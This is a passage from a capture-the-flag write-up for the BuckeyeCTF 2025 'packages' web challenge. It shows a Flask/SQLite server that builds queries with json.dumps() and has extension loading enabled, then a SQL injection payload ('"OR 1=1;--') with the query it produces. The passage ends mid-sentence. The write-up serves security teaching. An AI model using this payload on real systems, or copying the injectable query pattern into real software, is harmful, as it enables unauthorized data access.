<!DOCTYPE html><!--fiMZXb3kDk3bbcp3CO5oo--><html class="dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/2608bd98-1ec8-43f4-8a5a-bbe3e6cfd080" as="image"/><link rel="stylesheet" href="/_next/static/chunks/0ae28dad4c293945.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/9563dab5ba30607d.js"/><script src="/_next/static/chunks/df3f54071a4ab395.js" async=""></script><script src="/_next/static/chunks/5d5c0b7cd85c39a9.js" async=""></script><script src="/_next/static/chunks/88f90e91bf073dc9.js" async=""></script><script src="/_next/static/chunks/turbopack-448117163d91e6d2.js" async=""></script><script src="/_next/static/chunks/ff1a16fafef87110.js" async=""></script><script src="/_next/static/chunks/d037381d3416c607.js" async=""></script><script src="/_next/static/chunks/44838f11011a9f2d.js" async=""></script><script src="/_next/static/chunks/03f4569ba78edab9.js" async=""></script><script src="/_next/static/chunks/44f6ea3170f4e31a.js" async=""></script><script src="/_next/static/chunks/39b99946d2be6a43.js" async=""></script><script src="/_next/static/chunks/116d3b69f07f8eb7.js" async=""></script><meta name="next-size-adjust" content=""/><title>BuckeyeCTF 2025 — packages | kevin.fish</title><meta name="description" content="Explore the world of debian/debian-based packages."/><meta property="og:title" content="BuckeyeCTF 2025 — packages"/><meta property="og:description" content="Explore the world of debian/debian-based packages."/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="BuckeyeCTF 2025 — packages"/><meta name="twitter:description" content="Explore the world of debian/debian-based packages."/><script src="/_next/static/chunks/a6dad97d9634a72d.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>BuckeyeCTF 2025 — packages</h1>
<blockquote>
<p>Explore the world of debian/debian-based packages.</p>
<p><a href="https://packages.challs.pwnoh.io">https://packages.challs.pwnoh.io</a></p>
</blockquote>
<p>We&#x27;re given a Python server that looks like this:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">import</span><span class=""> sqlite3
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token keyword">import</span><span class=""> json
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">from</span><span class=""> flask </span><span class="token keyword">import</span><span class=""> Flask</span><span class="token punctuation">,</span><span class=""> request</span><span class="token punctuation">,</span><span class=""> render_template_string
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">app </span><span class="token operator">=</span><span class=""> Flask</span><span class="token punctuation">(</span><span class="">__name__</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">db </span><span class="token operator">=</span><span class=""> sqlite3</span><span class="token punctuation">.</span><span class="">connect</span><span class="token punctuation">(</span><span class="token string">&quot;packages.db&quot;</span><span class="token punctuation">,</span><span class=""> check_same_thread</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">db</span><span class="token punctuation">.</span><span class="">enable_load_extension</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">db</span><span class="token punctuation">.</span><span class="">row_factory </span><span class="token operator">=</span><span class=""> sqlite3</span><span class="token punctuation">.</span><span class="">Row
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">TEMPLATE </span><span class="token operator">=</span><span class=""> </span><span class="token triple-quoted-string string">&quot;&quot;&quot;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span>&lt;!doctype html&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span>&lt;html lang=&quot;en&quot;&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span>&lt;head&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span>    &lt;meta charset=&quot;utf-8&quot;&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span>    &lt;title&gt;Package Search&lt;/title&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span>    &lt;style&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span>        body { font-family: sans-serif; max-width: 800px; margin: 2rem auto; }
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span>        form { margin-bottom: 1rem; }
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>        table { border-collapse: collapse; width: 100%; }
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span>        th, td { border: 1px solid #ccc; padding: 0.5rem; text-align: left; }
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span>        th { background: #f4f4f4; }
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span>    &lt;/style&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span>&lt;/head&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span>&lt;body&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span>    &lt;h1&gt;Package Search&lt;/h1&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span>    &lt;form method=&quot;get&quot;&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span>        &lt;label&gt;Distro:
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span>            &lt;input name=&quot;distro&quot; value=&quot;{{ request.args.get(&#x27;distro&#x27;, &#x27;&#x27;) }}&quot;&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span>        &lt;/label&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span>        &lt;label&gt;Package:
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span>            &lt;input name=&quot;package&quot; value=&quot;{{ request.args.get(&#x27;package&#x27;, &#x27;&#x27;) }}&quot;&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span>        &lt;/label&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span>        &lt;button type=&quot;submit&quot;&gt;Search&lt;/button&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span>    &lt;/form&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span>
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span>    {% if results %}
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span>        &lt;h2&gt;Showing {{ results|length }} result{{ &#x27;s&#x27; if results|length != 1 else &#x27;&#x27; }}&lt;/h2&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span>        &lt;table&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span>            &lt;tr&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span>                &lt;th&gt;Distro&lt;/th&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span>                &lt;th&gt;Distro Version&lt;/th&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">44</span>                &lt;th&gt;Package&lt;/th&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">45</span>                &lt;th&gt;Package Version&lt;/th&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">46</span>            &lt;/tr&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">47</span>            {% for row in results %}
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">48</span>                &lt;tr&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">49</span>                    &lt;td&gt;{{ row[&#x27;distro&#x27;] }}&lt;/td&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">50</span>                    &lt;td&gt;{{ row[&#x27;distro_version&#x27;] }}&lt;/td&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">51</span>                    &lt;td&gt;{{ row[&#x27;package&#x27;] }}&lt;/td&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">52</span>                    &lt;td&gt;{{ row[&#x27;package_version&#x27;] }}&lt;/td&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">53</span>                &lt;/tr&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">54</span>            {% endfor %}
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">55</span>        &lt;/table&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">56</span>    {% else %}
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">57</span>        &lt;p&gt;No results found.&lt;/p&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">58</span>    {% endif %}
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">59</span>&lt;/body&gt;
</span><span class="token triple-quoted-string string"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">60</span>&lt;/html&gt;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="token triple-quoted-string string">&quot;&quot;&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">62</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">63</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class=""></span><span class="token decorator annotation punctuation">@app</span><span class="token decorator annotation punctuation">.</span><span class="token decorator annotation punctuation">route</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class=""> methods</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class=""></span><span class="token keyword">def</span><span class=""> </span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">66</span><span class="">    distro </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">args</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;distro&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">67</span><span class="">    package </span><span class="token operator">=</span><span class=""> request</span><span class="token punctuation">.</span><span class="">args</span><span class="token punctuation">.</span><span class="">get</span><span class="token punctuation">(</span><span class="token string">&quot;package&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">strip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">68</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">69</span><span class="">    sql </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;SELECT distro, distro_version, package, package_version FROM packages&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">70</span><span class="">    </span><span class="token keyword">if</span><span class=""> distro </span><span class="token keyword">or</span><span class=""> package</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">71</span><span class="">        sql </span><span class="token operator">+=</span><span class=""> </span><span class="token string">&quot; WHERE &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">72</span><span class="">    </span><span class="token keyword">if</span><span class=""> distro</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">73</span><span class="">        sql </span><span class="token operator">+=</span><span class=""> </span><span class="token string-interpolation string">f&quot;LOWER(distro) = </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">json</span><span class="token string-interpolation interpolation punctuation">.</span><span class="token string-interpolation interpolation">dumps</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation">distro</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">74</span><span class="">    </span><span class="token keyword">if</span><span class=""> distro </span><span class="token keyword">and</span><span class=""> package</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">75</span><span class="">        sql </span><span class="token operator">+=</span><span class=""> </span><span class="token string">&quot; AND &quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">76</span><span class="">    </span><span class="token keyword">if</span><span class=""> package</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">77</span><span class="">        sql </span><span class="token operator">+=</span><span class=""> </span><span class="token string-interpolation string">f&quot;LOWER(package) = </span><span class="token string-interpolation interpolation punctuation">{</span><span class="token string-interpolation interpolation">json</span><span class="token string-interpolation interpolation punctuation">.</span><span class="token string-interpolation interpolation">dumps</span><span class="token string-interpolation interpolation punctuation">(</span><span class="token string-interpolation interpolation">package</span><span class="token string-interpolation interpolation punctuation">)</span><span class="token string-interpolation interpolation punctuation">}</span><span class="token string-interpolation string">&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">78</span><span class="">    sql </span><span class="token operator">+=</span><span class=""> </span><span class="token string">&quot; ORDER BY distro, distro_version, package&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">79</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">80</span><span class="">    </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="">sql</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">81</span><span class="">    results </span><span class="token operator">=</span><span class=""> db</span><span class="token punctuation">.</span><span class="">execute</span><span class="token punctuation">(</span><span class="">sql</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="">fetchall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">82</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">83</span><span class="">    </span><span class="token keyword">return</span><span class=""> render_template_string</span><span class="token punctuation">(</span><span class="">TEMPLATE</span><span class="token punctuation">,</span><span class=""> request</span><span class="token operator">=</span><span class="">request</span><span class="token punctuation">,</span><span class=""> results</span><span class="token operator">=</span><span class="">results</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">84</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">85</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">86</span><span class=""></span><span class="token keyword">if</span><span class=""> __name__ </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">87</span><span class="">    app</span><span class="token punctuation">.</span><span class="">run</span><span class="token punctuation">(</span><span class="">host</span><span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">,</span><span class=""> port</span><span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span></code></pre></div></div>
<p>We can see that even though <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">json.dumps()</code> surrounds our query in quotes, we can still easily get SQL injection by putting quotes in our query ourselves: a <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">distro</code> of</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (sql)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">&quot;</span><span class="token operator">OR</span><span class=""> </span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">--</span></code></pre></div></div>
<p>results in the following SQL query</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (sql)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">SELECT</span><span class=""> distro</span><span class="token punctuation">,</span><span class=""> distro_version</span><span class="token punctuation">,</span><span class=""> package</span><span class="token punctuation">,</span><span class=""> package_version </span><span class="token keyword">FROM</span><span class=""> packages </span><span class="token keyword">WHERE</span><span class=""> LOWER</span><span class="token punctuation">(</span><span class="">distro</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;\&quot;OR 1=1;--&quot;</span></code></pre></div></div>
<p>and even though <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">json.dumps()</code> escapes our inner quote with a backslash, <a href="https://www.sqlite.org/lang_expr.html#literal_values_constants_">backslash escapes are not supported in SQLite</a> and the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">\</code> is treated as a plain character.</p>
<p>Another thing to notice is</p>
